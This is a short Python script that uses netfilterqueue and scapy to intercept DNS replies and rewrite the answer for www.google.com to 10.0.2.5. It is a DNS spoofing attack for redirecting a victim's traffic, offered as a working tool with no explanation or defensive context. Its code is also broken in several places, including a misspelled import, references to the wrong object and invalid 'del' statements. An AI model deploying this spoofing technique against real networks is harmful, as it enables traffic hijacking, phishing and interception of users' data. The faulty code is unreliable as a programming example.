import netfilterqueue
import scpay.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("[+]spoofing... ")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.5")
            scapy.packet[scapy.DNS].an =answer
            scapy.packet[scapy.DNS].ancount = 1

            del [scapy.IP].len
            del [scapy.IP].chksum
            del [scapy.UDP].chksum
            del [scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetFilterQueue()
queue.bind(0, process_packet)
queue.run()